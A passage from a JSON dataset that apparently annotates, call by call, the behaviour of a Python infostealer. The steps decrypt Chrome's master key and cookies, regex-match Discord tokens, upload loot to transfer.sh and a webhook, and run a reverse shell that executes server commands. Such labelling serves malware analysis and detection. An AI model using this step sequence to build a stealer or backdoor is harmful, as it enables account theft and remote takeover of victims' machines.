              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "local_state_path, 'r', encoding='latin-1'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Access browser local state",
              "intention_id": "access_browser_local_state"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "f.read()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state['os_crypt']['encrypted_key']",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode encrypted key",
              "intention_id": "decode_encrypted_key"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "key, None, None, None, 0",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'",
              "object_description": "Chrome cookies file",
              "object_id": "chrome_cookies_file",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "shutil.copyfile()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "db_path, filename",
              "object_description": "Chrome cookies file and temporary file path",
              "object_id": "chrome_cookies_temp_file",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "filename",
              "object_description": "Chrome cookies file",
              "object_id": "chrome_cookies_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser cookies data",
              "intention_id": "query_browser_cookies"
            },
            {
              "action_api": "self.DecryptData()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "encrypted_value, key",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser cookie value",
              "intention_id": "decrypt_browser_cookie"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f-string with cookie info",
              "object_description": "Cookie data string",
              "object_id": "cookie_data_string",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "db.commit()",
              "action_description": "Commits current transaction to SQLite database",
              "action_id": "commit_transaction",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Finalize file for later use",
              "intention_id": "finalize_file_later_use"
            },
            {
              "action_api": "db.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "LOGGER.UploadFile()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "randomfilename, filename='Chrome Cookies'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Extract file upload response",
              "intention_id": "extract_file_upload_response"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'LOCALAPPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'APPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "os.path.join(path, file_name), errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', line",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'mfa\\.[\\w-]{84}', line",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "randomfilename, 'w'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write token data to file",
              "intention_id": "write_token_data_file"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "str(self.tokeninfo)",
              "object_description": "Token data string",
              "object_id": "cookie_data_string",
              "intention_description": "Write token data to file",
              "intention_id": "write_token_data_file"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "LOGGER.UploadFile()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "randomfilename, filename='Token File'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Extract file upload response",
              "intention_id": "extract_file_upload_response"
            },
            {
              "action_api": "get()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "https://discordapp.com/api/v9/users/@me, headers=headers",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Check validity of authentication cookie",
              "intention_id": "check_authentication_cookie"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "heading",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "VARIABLES.webhook, headers={'content-type': 'application/json'}, data=json.dumps(heading).encode()",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "get()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "https://icanhazip.com",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "os.getcwd()",
              "action_description": "Returns current working directory",
              "action_id": "get_working_dir",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "sock.socket()",
              "action_description": "Creates new socket object",
              "action_id": "create_socket",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Establish connection",
              "intention_id": "establish_connection"
            },
            {
              "action_api": "s.connect()",
              "action_description": "Establishes TCP connection to specified address",
              "action_id": "establish_tcp_connection",
              "object": "(VARIABLES.serverip, VARIABLES.port)",
              "object_description": "Public IP address and port",
              "object_id": "public_ip_port",
              "intention_description": "Connect to remote server",
              "intention_id": "connect_remote_server"
            },
            {
              "action_api": "self.cwd.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "self.cwd",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "s.send()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "self.cwd.encode()",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "Send working directory to server",
              "intention_id": "send_working_directory_server"
            },
            {
              "action_api": "s.recv()",
              "action_description": "Receives data from socket connection",
              "action_id": "receive_socket_data",
              "object": "VARIABLES.buffer",
              "object_description": "Buffer size",
              "object_id": "",
              "intention_description": "Receive command from server",
              "intention_id": "receive_command_from_server"
            },
            {
              "action_api": "sp.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "command",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "message.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "message",
              "object_description": "Command output",
              "object_id": "command_output",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "s.send()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "message.encode()",
              "object_description": "Command output",
              "object_id": "command_output",
              "intention_description": "Send command output to server",
              "intention_id": "send_command_output_server"
            },
            {
              "action_api": "s.close()",
              "action_description": "Closes the socket connection",
              "action_id": "close_socket",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release connection resource",
              "intention_id": "release_connection_resource"
            },
            {
              "action_api": "print()",
              "action_description": "Prints output to standard output",
              "action_id": "",
              "object": "VARIABLES.endText if VARIABLES.printOnEnd else \"\"",
              "object_description": "",
              "object_id": "",
              "intention_description": "Acknowledge keylogger start/stop",
              "intention_id": "acknowledge_keylogger_status"
            }
          ]
        }
      ]
    }
  ]
}